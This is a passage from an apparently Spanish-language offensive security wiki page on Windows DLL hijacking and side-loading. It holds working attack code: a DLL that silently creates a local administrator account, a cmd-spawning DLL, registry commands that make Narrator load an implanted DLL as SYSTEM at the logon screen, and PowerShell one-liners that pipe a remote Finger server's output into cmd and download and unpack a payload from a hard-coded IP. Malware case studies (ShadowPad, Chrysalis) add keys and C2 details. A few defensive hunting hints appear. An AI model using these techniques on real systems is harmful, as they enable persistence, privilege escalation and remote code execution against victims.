//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternativa con punto de entrada de hilo</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Caso práctico: secuestro de DLL de localización de Narrator OneCore TTS (accesibilidad/ATs)

Windows Narrator.exe sigue buscando al iniciarse una DLL de localización predecible y específica del idioma, que puede secuestrarse para ejecutar código arbitrario y lograr persistencia.<sup>[[7]](#references)</sup>

Datos clave
- Ruta de búsqueda (compilaciones actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ruta heredada (compilaciones anteriores): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL controlada por un atacante y con permisos de escritura en la ruta de OneCore, se carga y se ejecuta `DllMain(DLL_PROCESS_ATTACH)`. No se requieren exports.

Detección con Procmon
- Filtro: `Process Name is Narrator.exe` y `Operation is Load Image` o `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta indicada.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Silencio OPSEC
- Un hijack ingenuo mostrará o resaltará la UI. Para pasar desapercibido, al adjuntarte enumera los threads de Narrator, abre el thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y suspéndelo con `SuspendThread`; continúa en tu propio thread. Consulta el PoC para ver el código completo.<sup>[[8]](#references)</sup>

Activación y persistencia mediante la configuración de Accessibility
- Contexto del usuario (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, al iniciar Narrator se carga la DLL implantada. En el secure desktop (pantalla de inicio de sesión), presiona CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.

Ejecución SYSTEM activada por RDP (movimiento lateral)
- Permite la capa de seguridad clásica de RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conéctate al host por RDP y, en la pantalla de inicio de sesión, presiona CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.
- La ejecución se detiene cuando se cierra la sesión RDP: inyecta/migra cuanto antes.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada de registro de una herramienta de Accessibility integrada (por ejemplo, CursorIndicator), editarla para que apunte a un binario/DLL arbitrario, importarla y luego establecer `configuration` con el nombre de esa herramienta. Esto permite ejecutar código arbitrario mediante el framework de Accessibility.

Notas
- Escribir en `%windir%\System32` y cambiar valores de HKLM requiere derechos de administrador.
- Toda la lógica del payload puede estar en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Caso práctico: CVE-2025-1729 - Escalada de privilegios mediante TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en el TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), registrado como **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalles de la vulnerabilidad

- **Componente**: `TPQMAssistant.exe`, ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarea programada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM con el contexto del usuario que inició sesión.
- **Permisos del directorio**: `CREATOR OWNER` tiene permisos de escritura, lo que permite a usuarios locales dejar archivos arbitrarios.
- **Comportamiento de búsqueda de DLL**: primero intenta cargar `hostfxr.dll` desde su directorio de trabajo y registra "NAME NOT FOUND" si no la encuentra, lo que indica que la búsqueda da prioridad al directorio local.

### Implementación del exploit

Un atacante puede colocar un stub malicioso de `hostfxr.dll` en el mismo directorio y aprovechar la DLL ausente para lograr la ejecución de código en el contexto del usuario:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Flujo del ataque

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM en el contexto del usuario actual.
3. Si hay un administrador conectado cuando se ejecuta la tarea, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadena técnicas estándar de UAC bypass para escalar de integridad media a privilegios de SYSTEM.

## Caso de estudio: Dropper de MSI + DLL side-loading mediante un host firmado (wsc_proxy.exe)

Los actores de amenazas suelen combinar droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso confiable y firmado.<sup>[[10]](#references)</sup>

Descripción general de la cadena
- El usuario descarga el MSI. Una CustomAction se ejecuta silenciosamente durante la instalación mediante la GUI (por ejemplo, LaunchApplication o una acción de VBScript) y reconstruye la siguiente etapa a partir de recursos incrustados.
- El dropper escribe un EXE legítimo y firmado, y una DLL maliciosa, en el mismo directorio (ejemplo de pareja: wsc_proxy.exe firmado por Avast + wsc.dll controlada por el atacante).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLL de Windows carga primero wsc.dll desde el directorio de trabajo y ejecuta el código del atacante bajo un proceso principal firmado (ATT&CK T1574.001).

Análisis del MSI (qué buscar)
- Tabla CustomAction:
  - Busca entradas que ejecuten archivos ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecuta en segundo plano un archivo incrustado.
  - En Orca (Microsoft Orca.exe), inspecciona las tablas CustomAction, InstallExecuteSequence y Binary.
- Payloads incrustados/divididos en el CAB del MSI:
  - Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
  - O usa lessmsi: lessmsi x package.msi C:\out
  - Busca varios fragmentos pequeños que una CustomAction de VBScript concatena y descifra. Flujo habitual:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading con wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
  - wsc_proxy.exe: host legítimo firmado (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
  - wsc.dll: DLL del atacante. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, crea una proxy DLL y reenvía los exports necesarios a la biblioteca genuina mientras ejecutas el payload en DllMain.
- Crea un payload DLL mínimo:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Para cumplir los requisitos de exportación, usa un framework de proxy (p. ej., DLLirant/Spartacus) para generar una DLL de reenvío que también ejecute tu payload.

- Esta técnica depende de la resolución de nombres de DLL por parte del binario anfitrión. Si el anfitrión usa rutas absolutas o flags de carga segura (p. ej., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS y las exportaciones reenviadas pueden influir en la precedencia, y deben tenerse en cuenta al elegir el binario anfitrión y el conjunto de exportaciones.

## Tríadas firmadas + payloads cifrados (estudio de caso de ShadowPad)

Check Point describió cómo Ink Dragon implementa ShadowPad mediante una **tríada de tres archivos** que se camufla entre software legítimo y mantiene cifrado en disco el payload principal:<sup>[[12]](#references)</sup>

1. **EXE host firmado** – se abusa de proveedores como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes cambian el nombre del ejecutable para que parezca un binario de Windows (por ejemplo, `conhost.exe`), pero la firma Authenticode sigue siendo válida.
2. **DLL loader maliciosa** – se coloca junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL suele ser un binario MFC ofuscado con el framework ScatterBrain; su única función es localizar el blob cifrado, descifrarlo y mapear ShadowPad de forma reflectiva.
3. **Blob de payload cifrado** – a menudo se almacena como `<name>.tmp` en el mismo directorio. Tras mapear el payload descifrado en memoria, el loader elimina el archivo TMP para destruir pruebas forenses.

Notas sobre tradecraft:

* Cambiar el nombre del EXE firmado (conservando el `OriginalFileName` original en el encabezado PE) permite hacerlo pasar por un binario de Windows y mantener la firma del proveedor, así que replica la costumbre de Ink Dragon de soltar binarios con apariencia de `conhost.exe` que en realidad son utilidades de AMD/NVIDIA.
* Como el ejecutable sigue siendo de confianza, la mayoría de los controles de allowlisting solo requieren que tu DLL maliciosa esté junto a él. Concéntrate en personalizar la DLL loader; normalmente, el proceso padre firmado puede ejecutarse sin modificaciones.
* El decryptor de ShadowPad espera que el blob TMP esté junto al loader y se pueda modificar para poder poner el archivo a cero después del mapeo. Mantén el directorio con permisos de escritura hasta que se cargue el payload; una vez en memoria, el archivo TMP se puede eliminar de forma segura por OPSEC.

### Cadena de stager LOLBAS + sideloading de archivo comprimido en etapas (finger → tar/curl → WMI)

Los operadores combinan DLL sideloading con LOLBAS para que el único artefacto personalizado en el disco sea la DLL maliciosa junto al EXE de confianza:<sup>[[1]](#references)</sup>

- **Cargador de comandos remoto (Finger):** PowerShell oculto inicia `cmd.exe /c`, obtiene comandos de un servidor Finger y los canaliza a `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` obtiene texto TCP/79; `| cmd` ejecuta la respuesta del servidor, lo que permite a los operadores rotar el servidor de segunda etapa desde el servidor.

- **Descarga/extracción integrada:** Descarga un archivo comprimido con una extensión inofensiva, descomprímelo y coloca el objetivo de sideload junto con la DLL en una carpeta aleatoria de `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` oculta el progreso y sigue las redirecciones; `tar -xf` usa la herramienta tar integrada en Windows.

  - **Ejecución mediante WMI/CIM:** Inicia el EXE mediante WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL ubicada junto a él:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funciona con binarios que prefieren DLL locales (p. ej., `intelbq.exe`, `nearby_share.exe`); el payload (p. ej., Remcos) se ejecuta bajo el nombre de confianza.

- **Hunting:** Genera una alerta si `forfiles` usa `/p`, `/m` y `/c` a la vez; es poco común fuera de scripts de administración.


## Caso de estudio: dropper NSIS + sideload del Bitdefender Submission Wizard (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización de confianza para distribuir un dropper empaquetado con NSIS que preparaba un sideload de DLL y payloads completamente en memoria.<sup>[[13]](#references)</sup>

Flujo de tradecraft
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca como **HIDDEN**, deposita un Bitdefender Submission Wizard renombrado (`BluetoothService.exe`), un `log.dll` malicioso y un blob cifrado llamado `BluetoothService`, y luego ejecuta el EXE.
- El EXE del host importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob con mmap; `LogWrite` lo descifra mediante un flujo personalizado basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, material de clave derivado de un hash anterior), sobrescribe el búfer con shellcode en texto plano, libera los temporales y salta a él.
- Para evitar una IAT, el loader resuelve las APIs mediante hashes de los nombres de exportación, usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193** y aplicando después una función de mezcla final de estilo Murmur (**0x85EBCA6B**); luego compara el resultado con hashes de destino con sal.

Shellcode principal (Chrysalis)
- Descifra un módulo principal similar a un PE repitiendo operaciones de suma/XOR/resta con la clave `gQ2JR&9;` en cinco pasadas y, después, carga dinámicamente `Kernel32.dll` → `GetProcAddress` para completar la resolución de importaciones.
- Reconstruye cadenas con nombres de DLL durante la ejecución mediante transformaciones de rotación de bits/XOR por carácter y luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre **PEB → InMemoryOrderModuleList**, analiza cada tabla de exportaciones en bloques de 4 bytes con una mezcla de estilo Murmur y solo recurre a `GetProcAddress` si no encuentra el hash.

Configuración integrada y C2
- La configuración está dentro del archivo `BluetoothService` depositado, en el **offset 0x30808** (tamaño **0x980**), y se descifra con RC4 usando la clave `qwhvb^435h&*7`, lo que revela la URL de C2 y el User-Agent.
- Los beacons crean un perfil del host delimitado por puntos, anteponen la etiqueta `4Q` y luego lo cifran con RC4 usando la clave `vAuig34%^325hGV` antes de llamar a `HttpSendRequestA` por HTTPS. Las respuestas se descifran con RC4 y se procesan mediante un switch de etiquetas (`4T` shell, `4V` ejecución de procesos, `4W/4X` escritura de archivos, `4Y` lectura/exfiltración, `4\\` desinstalación, `4` enumeración de unidades/archivos + casos de transferencia por bloques).
- El modo de ejecución depende de los argumentos de CLI: sin argumentos = instala persistencia (servicio/clave Run) que apunta a `-i`; `-i` vuelve a ejecutar el proceso con `-k`; `-k` omite la instalación y ejecuta el payload.

Loader alternativo observado
- En la misma intrusión se depositó Tiny C Compiler y se ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` junto a él. El código fuente C proporcionado por el atacante integraba shellcode, se compilaba y se ejecutaba en memoria sin escribir un PE en el disco. Replicar con:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Esta etapa de compilación y ejecución basada en TCC importó `Wininet.dll` en tiempo de ejecución y obtuvo un shellcode de segunda etapa desde una URL codificada, lo que proporcionó un loader flexible que se hacía pasar por una ejecución del compilador.

## Sideloading de un host firmado con export proxying + parking del hilo del host

Algunas cadenas de DLL sideloading incorporan **medidas de estabilidad** para que el host legítimo permanezca activo el tiempo suficiente para cargar las etapas posteriores sin problemas, en lugar de fallar después de cargar la DLL maliciosa.<sup>[[11]](#references)</sup>

Patrón observado
- Coloca un EXE de confianza junto a una DLL maliciosa que use el nombre de dependencia esperado, como `version.dll`.
- La DLL maliciosa **hace proxy de todas las exportaciones esperadas** hacia la DLL real del sistema (por ejemplo, `%SystemRoot%\\System32\\version.dll`) para que la resolución de importaciones siga funcionando y el proceso host continúe operando.
- Después de cargarse, la DLL maliciosa **parchea el punto de entrada del host** para que el hilo principal entre en un bucle infinito de `Sleep`, en lugar de salir o ejecutar rutas de código que terminarían el proceso.
- Un hilo nuevo realiza el trabajo malicioso real: descifra el nombre o la ruta de la DLL de la siguiente etapa (RC4/XOR son opciones comunes) y luego la carga con `LoadLibrary`.

Por qué es importante
- El proxying normal de DLL conserva la compatibilidad de la API, pero no garantiza que el host permanezca activo el tiempo suficiente para las etapas posteriores.
- Dejar el hilo principal bloqueado en `Sleep(INFINITE)` es una forma sencilla de mantener residente el proceso firmado mientras el loader realiza el descifrado, la preparación de etapas o el bootstrap de red en un hilo de trabajo.
- Buscar únicamente un `DllMain` sospechoso puede pasar por alto este patrón si el comportamiento relevante ocurre después de parchear el punto de entrada del host y de iniciar un hilo secundario.

Flujo de trabajo mínimo
1. Copia el EXE del host firmado y determina qué DLL resuelve desde el directorio local.
2. Crea una DLL proxy que exporte las mismas funciones y las reenvíe a la DLL legítima.
3. En `DllMain(DLL_PROCESS_ATTACH)`, crea un hilo de trabajo.
4. Desde ese hilo, parchea el punto de entrada del host o la rutina de inicio del hilo principal para que entre en un bucle de `Sleep`.
5. Descifra el nombre/configuración de la DLL de la siguiente etapa y llama a `LoadLibrary` o haz manual-map del payload.

Pistas para la defensa
- Procesos firmados que cargan `version.dll` u otras bibliotecas comunes desde su propio directorio de aplicación, en lugar de `System32`.
- Parches de memoria en el punto de entrada del proceso poco después de cargar la imagen, especialmente saltos/llamadas redirigidos a `Sleep`/`SleepEx`.
- Hilos creados por una DLL proxy que llaman inmediatamente a `LoadLibrary` con una segunda DLL cuyo nombre se descifró.
- DLL proxy que exportan todas las funciones y están ubicadas junto a ejecutables de proveedores en directorios de preparación con permisos de escritura, como `ProgramData`, `%TEMP%` o rutas de archivos comprimidos descomprimidos.

## References

- [1] [Red Canary – Análisis de inteligencia: enero de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729: escalada de privilegios mediante TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking en Windows. Ejemplo sencillo en C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore despliega nuevo malware dirigido a Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: cuando los DLL hijacks se encuentran con los asistentes de Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Dobles digitales: anatomía de las campañas de suplantación en evolución que distribuyen Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Intereses convergentes: análisis de grupos de amenazas que atacan a un gobierno del sudeste asiático](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Dentro de Ink Dragon: revelación de la red de retransmisión y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis: análisis detallado del toolkit de Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Cadena HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Seguimiento de las campañas de espionaje de 2026 del APT iraní Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Rápido y furioso: operaciones de Nimbus Manticore durante el conflicto iraní](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Acciones de tareas](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 ataca a gobiernos e infraestructura crítica del sudeste asiático](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – Formato PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – Detección de una variante de SectopRAT integrada en software legítimo](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
